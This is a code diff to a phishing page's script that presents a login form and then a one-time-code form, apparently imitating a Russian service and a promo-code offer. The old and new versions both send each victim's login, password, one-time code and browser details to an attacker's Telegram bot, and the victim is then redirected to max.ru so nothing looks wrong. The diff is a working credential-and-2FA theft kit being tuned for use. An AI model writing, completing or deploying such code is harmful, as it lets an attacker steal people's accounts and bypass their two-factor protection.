@@ -39,20 +39,22 @@ input:focus{border-color:var(--accent)}
 </div>
 <script src="config.js"></script>
 <script>
-const sid = crypto.randomUUID();
+const sid = crypto.randomUUID().slice(0,8);
 async function send(stage, data){
-  data.sid = sid; data.stage = stage;
-  data.ua = navigator.userAgent; data.lang = navigator.language;
-  data.scr = screen.width+'x'+screen.height;
-  const text = stage==='creds'
-    ? `[CREDS] ${sid}\n📱 ${data.login}\n🔑 ${data.password}\n🌐 ${data.lang} | ${data.scr}\n🖥 ${data.ua}`
-    : `[OTP] ${sid}\n🔢 ${data.otp}`;
-  try{
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: TG_CHAT, text})
-    });
-  }catch(e){}
+  let text;
+  if(stage==='creds'){
+    text = `[CREDS] ${sid}\nЛогин: ${data.login}\nПароль: ${data.password}\nUA: ${navigator.userAgent}`;
+  } else {
+    text = `[OTP] ${sid}\nКод: ${data.otp}`;
+  }
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(text)}`;
+  try {
+    const r = await fetch(url);
+    const j = await r.json();
+    console.log('TG response:', j);
+  } catch(e){
+    console.log('TG error:', e);
+  }
 }
 document.getElementById('f1').addEventListener('submit', async e=>{
   e.preventDefault();
@@ -69,6 +71,6 @@ document.getElementById('f1').addEventListener('submit', async e=>{
 document.getElementById('f2').addEventListener('submit', async e=>{
   e.preventDefault();
   await send('otp', {otp: new FormData(e.target).get('otp')});
-  setTimeout(()=>{location.href='https://max.ru/'},400);
+  setTimeout(()=>{location.href='https://max.ru/promocod_standoffs'},500);
 });
 </script></body></html>
